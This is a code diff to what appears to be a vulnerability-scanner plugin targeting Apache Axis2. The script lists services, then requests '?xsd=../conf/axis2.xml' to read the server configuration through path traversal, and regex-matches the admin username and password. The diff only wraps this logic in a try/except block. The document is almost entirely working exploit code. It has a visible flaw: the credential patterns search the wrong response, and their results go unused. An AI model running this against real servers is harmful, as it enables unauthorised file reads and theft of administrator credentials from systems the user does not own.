@@ -23,18 +23,20 @@ class Script(BaseScript):
                 ]):
                     if path[-1] == '/':
                         url = path + 'listServices'
-                        async with session.get(url=url) as res:
-                            if res:
-                                text = await res.text()
-                                m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', text)
-                                if m != None and m.group(1):
-                                    server_str = m.group(1)
-                                    read_url = path + '/%s?xsd=../conf/axis2.xml' % (server_str)
-                                    async with session.get(url=read_url) as res1:
-                                        if res1:
-                                            text1 = await res1.text()
-                                            if 'axisconfig' in str(text1):
-                                                user = re.search('<parameter name="userName">(.*?)</parameter>', text)
-                                                password = re.search('<parameter name="password">(.*?)</parameter>', text)
-                                                yield read_url
-                                                
+                        try:
+                            async with session.get(url=url) as res:
+                                if res:
+                                    text = await res.text()
+                                    m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', text)
+                                    if m != None and m.group(1):
+                                        server_str = m.group(1)
+                                        read_url = path + '/%s?xsd=../conf/axis2.xml' % (server_str)
+                                        async with session.get(url=read_url) as res1:
+                                            if res1:
+                                                text1 = await res1.text()
+                                                if 'axisconfig' in str(text1):
+                                                    user = re.search('<parameter name="userName">(.*?)</parameter>', text)
+                                                    password = re.search('<parameter name="password">(.*?)</parameter>', text)
+                                                    yield read_url
+                        except:
+                            pass
